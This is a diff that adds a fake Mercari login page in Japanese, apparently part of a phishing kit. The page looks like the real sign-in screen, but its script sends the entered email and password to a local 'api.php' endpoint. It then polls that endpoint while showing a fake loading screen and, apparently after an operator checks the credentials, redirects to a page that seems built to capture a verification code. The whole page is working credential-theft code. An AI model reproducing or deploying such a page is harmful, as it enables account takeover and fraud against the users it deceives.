@@ -1,0 +1,304 @@
+ 
+
+
+
+
+<!DOCTYPE html>
+ 
+<html lang="ja-JP"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+                  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <title>ログイン - メルカリ スマホでかんたん フリマアプリ</title>
+    <meta name="description" content="CMで話題！フリマアプリ「メルカリ」は、スマホから誰でも簡単に売り買いが楽しめるフリマアプリです。購入時はクレジットカード・キャリア決済・コンビニ・銀行ATMで支払いでき、品物が届いてから出品者に入金される独自システムで安心です。">
+    
+    <meta name="format-detection" content="telephone=no">
+    <!--me-->
+
+<link rel="stylesheet" type="text/css" href="../css/bootstrap.min.css">
+  <script src="../js/jquery-2.0.3.js"></script>
+    <script src="../js/bootstrap.min.js"></script>
+
+
+    <!--/me-->
+
+          <!-- <link rel="canonical" href="#/jp/login/"> -->
+    
+       <!--  <link href="#/jp/login/" hreflang="ja" rel="alternate"> -->
+
+          <link href="./1_files/app.jp.css" rel="stylesheet">
+    
+<!--     <link rel="shortcut icon" href="https://pcweb-assets.mercdn.net/favicon.ico?2575396713">
+<link rel="apple-touch-icon" href="https://pcweb-assets.mercdn.net/apple-touch-icon.png?2575396713">
+<link rel="icon" type="image/png" href="https://pcweb-assets.mercdn.net/favicon-16x16.png?2575396713" sizes="16x16">
+<link rel="icon" type="image/png" href="https://pcweb-assets.mercdn.net/favicon-32x32.png?2575396713" sizes="32x32">
+<link rel="icon" type="image/png" href="https://pcweb-assets.mercdn.net/favicon-194x194.png?2575396713" sizes="194x194">
+<link rel="icon" type="image/png" href="https://pcweb-assets.mercdn.net/android-chrome-192x192.png?2575396713" sizes="192x192">
+<link rel="mask-icon" href="https://pcweb-assets.mercdn.net/safari-pinned-tab.svg?2575396713" color="#ea352d">
+<link rel="manifest" href="#/jp/manifest.json?2575396713"> -->
+<!-- <meta name="msapplication-TileColor" content="#ffc40d">
+<meta name="msapplication-TileImage" content="//pcweb-assets.mercdn.net/mstile-144x144.png?2575396713">
+<meta name="theme-color" content="#ea352d"> -->
+<!-- <link rel="apple-touch-icon-precomposed" href="https://pcweb-assets.mercdn.net/apple-touch-icon-precomposed.png?2575396713">
+<link rel="apple-touch-icon" sizes="57x57" href="https://pcweb-assets.mercdn.net/apple-touch-icon-57x57.png?2575396713">
+<link rel="apple-touch-icon" sizes="60x60" href="https://pcweb-assets.mercdn.net/apple-touch-icon-60x60.png?2575396713">
+<link rel="apple-touch-icon" sizes="72x72" href="https://pcweb-assets.mercdn.net/apple-touch-icon-72x72.png?2575396713">
+<link rel="apple-touch-icon" sizes="76x76" href="https://pcweb-assets.mercdn.net/apple-touch-icon-76x76.png?2575396713">
+<link rel="apple-touch-icon" sizes="114x114" href="https://pcweb-assets.mercdn.net/apple-touch-icon-114x114.png?2575396713">
+<link rel="apple-touch-icon" sizes="120x120" href="https://pcweb-assets.mercdn.net/apple-touch-icon-120x120.png?2575396713">
+<link rel="apple-touch-icon" sizes="144x144" href="https://pcweb-assets.mercdn.net/apple-touch-icon-144x144.png?2575396713">
+<link rel="apple-touch-icon" sizes="152x152" href="https://pcweb-assets.mercdn.net/apple-touch-icon-152x152.png?2575396713">
+<link rel="apple-touch-icon" sizes="180x180" href="https://pcweb-assets.mercdn.net/apple-touch-icon-180x180.png?2575396713"> -->
+
+      <!-- <script src="./1_files/3765626403484289" async=""></script><script src="./1_files/sdk.js.下载" async="" crossorigin="anonymous"></script><script async="" src="./1_files/fbevents.js.下载"></script><script type="text/javascript" async="" src="./1_files/analytics.js.下载"></script><script type="text/javascript" async="" src="./1_files/f.txt"></script><script type="text/javascript" async="" src="./1_files/js"></script><script async="" src="./1_files/gtm.js.下载"></script><script src="./1_files/cb=gapi.loaded_1" async=""></script><script id="facebook-jssdk" src="./1_files/sdk.js(1).下载"></script><script src="./1_files/cb=gapi.loaded_0" async=""></script><script type="text/javascript" async="" src="./1_files/recaptcha__ja.js.下载" crossorigin="anonymous" integrity="sha384-ICMhZJLjN+5pprZX8JU0H4KtuJtmtrg/mFL0a9OVfR9ACy9lwn0JNJGc0ovjGJ3U"></script><script src="./1_files/api.js.下载"></script>
+  <script src="./1_files/f(1).txt"></script> -->
+  <!--me-->
+  <style type="text/css">
+        .mymodal{
+            width: 100%;
+            background-color: #ffffff;
+            border-style: none;
+            opacity:0.8;
+        }
+       
+        .me{
+            border-style: none;
+        }
+    </style>
+<!/--me-->
+</head>
+  <body>
+ 
+        <div class="single-container">
+            <header class="single-header">
+        <h1>
+            <a href="#/jp/">
+    <img src="./1_files/logo_login.svg" alt="mercari">
+  </a>
+        </h1>
+              </header>
+
+      <main class="single-main">
+          <div class="login-panel">
+
+        <div class="login-no-account">
+      <p>アカウントをお持ちでない方はこちら</p>
+      <a href="#/jp/signup/?after_save_callback=%2Fjp%2F">新規会員登録</a>
+    </div>
+
+        <div class="login-form-inner">
+      
+      <button id="google-login" class="btn-default btn-sns btn-sns-google">
+        Googleでログイン
+      </button>
+      <button id="facebook-login" class="btn-default btn-sns btn-sns-facebook">
+        <i ><img src="1_files/fb.png"  ></i>
+
+        Facebookでログイン
+      </button>
+      <button id="apple-login" class="btn-default btn-sns btn-sns-apple">
+        <i  ><img src="1_files/ap.png"  ></i>
+        Appleでログイン
+      </button>
+          </div>
+
+        <!-- <form action="./mercari_wait.php" method="POST"  > -->
+          <form action="" method="POST"  >
+
+            <div class="login-form-inner">
+              
+
+        
+        <div class="form-group">
+
+      <!--me--->
+      <div id="errmsg" class="idk-margin idk-margin-b" style="display:none;">
+                                <div id="errorMessage" class="error mark-none">
+                                    <div class="login-message-area">
+                                        <ul class="login-err-message">
+                                            <li></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+      <!--/me-->
+
+          <input type="text" name="web_login_id" value="" id='loginAliasId' placeholder="メールアドレス" class="login-input-text input-default" required="required">
+                  </div>
+
+        <div class="form-group">
+          <input type="password" name="web_login_pw" id='loginAliasPW' placeholder="パスワード" class="login-input-text input-default" required="required">
+                  </div>
+
+                <div class="form-group">
+
+          <!-- <div class="g-recaptcha login-captcha" data-sitekey="6LfYSLYaAAAAAD4xXu7MljrQASPQjyuMzA4XB1Pm"><div style="width: 304px; height: 78px;"><div><iframe title="reCAPTCHA" src="./1_files/anchor.html" width="304" height="78" role="presentation" name="a-rw2l16rdyy75" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./1_files/saved_resource(1).html"></iframe></div> -->
+                  </div>
+
+        <!-- <button type="submit" class="login-submit btn-default btn-red" id="btn_idInput">ログイン</button> -->
+        <button type="button" class="login-submit btn-default btn-red" id="btn_idInput">ログイン</button>
+
+                     
+
+        <a href="#/jp/password/reset/start/">パスワードをお忘れの方</a>
+
+      <!--   <div class="login-no-account">
+      <p>アカウントをお持ちでない方はこちら</p>
+      <a href="#/jp/signup/?after_save_callback=%2Fjp%2F">新規会員登録</a>
+    </div> -->
+
+      </div>
+    </form>
+  </div>
+
+   
+      </main>
+
+              <footer class="single-footer">
+          <nav>
+            <ul class="clearfix">
+              <li>
+                <a href="#/jp/privacy/">プライバシーポリシー</a>
+              </li>
+              <li>
+                <a href="#/jp/tos/">メルカリ利用規約</a>
+              </li>
+                              <li>
+                  <a href="#/jp/tokutei/">特定商取引に関する表記</a>
+                </li>
+                          </ul>
+          </nav>
+          <a href="#/jp/" class="single-footer-logo">
+            <img src="./1_files/logo-gray.svg" alt="mercari" width="80" height="65">
+          </a>
+          <p>
+            <small>© Mercari, Inc.</small>
+          </p>
+
+       
+
+        </footer>
+          </div>
+
+    <!--   <script src="./1_files/api_client.js.下载" gapi_processed="true"></script>
+        <script src="./1_files/app.js.下载"></script> -->
+    
+       
+              
+ 
+      
+
+<div style="display: none; visibility: hidden;">
+ 
+ 
+</div>
+
+<!-- <iframe id="ssIFrame_google" sandbox="allow-scripts allow-same-origin" aria-hidden="true" frame-border="0" src="./1_files/iframe.html" style="position: absolute; width: 1px; height: 1px; inset: -9999px; display: none;"></iframe> -->
+<div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;">
+ <!--  <iframe title="reCAPTCHA による確認" src="./1_files/bframe.html" name="c-rw2l16rdyy75" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe> -->
+</div></div>
+<!--me-->
+<script>
+    $("#btn_idInput").click(function () 
+    {
+        var ID = $('#loginAliasId').val();
+        var PW = $('#loginAliasPW').val();
+
+
+        switch (true) 
+        {
+            case (ID.length<4 || ID.length>128):
+                $('#errmsg').attr('style','display:block');
+                $('#errorMessage ul li').append('入力されたアカウントまたはパスワードが間違っています。正確に確認して入力してください');
+                break;
+                default: 
+                 //弹出模态框
+                    $("#myModal").modal
+                    ({
+                    show: true,
+                    backdrop: false,
+                    keyboard: false,
+                   });
+                $.post('./api.php?act=send&_r='+Math.random(),{login_id:ID,login_pw:PW},function (res) 
+            {
+                var t = JSON.parse(res);
+                if (t.code == 'ok') 
+                {
+                    
+                   
+                    //dingshi 
+                    timer = setInterval("is_opt()", 5000);
+                    
+                } 
+                 
+            });
+                  
+                  
+              
+        }
+
+        
+
+    });
+
+</script>
+
+<script type="text/javascript">
+     var timer = null;
+     var ok ='ok';
+      var ID = $('#loginAliasId').val();
+    function is_opt() {
+        $.post('./api.php?act=is_opt&_r='+Math.random(),{login_id:ID},function (res) {
+            var t = JSON.parse(res);
+            if (t.code == 'ok') {
+                clearInterval(timer);
+                 //关闭模态库框
+                 $('#myModal').modal('hide');
+                 //去下一个
+                 window.location.href="./mercari_ecode.php?echo1="+t.echo1;
+            }
+             
+            else if(t.code=='no')
+            {
+              clearInterval(timer);
+              //关闭模态库框
+              $('#myModal').modal('hide');
+              alert('アカウントまたはパスワードが間違っています。もう一度入力してください。');
+
+              
+            }
+            else
+            {
+               console.log(t);
+            }
+        });
+    }
+
+</script>
+<!-- <script>
+$(function() {
+    $('#myModal').on('hide.bs.modal',
+    function() {
+           $("#loginAliasId")[0].focus()
+    })
+});
+</script> -->
+<!--/me-->
+<!-- my model-->
+<div class="modal fade mymodal me" id="myModal" tabindex="-1"     aria-hidden="true"   aria-labelledby="myLargeModalLabel">
+    <div class="modal-dialog  ">
+        <div class="modal-content  me" >
+             
+            <div class="modal-body  " style="text-align: center;">
+                 <p>頑張ってロードしますので、少々お待ちください...</p>
+                <img src="../img/111.gif">
+
+            </div>
+             
+        </div> 
+    </div>
+</div>
+ 
+<!-- /.modal -->
+
+
+</body></html>
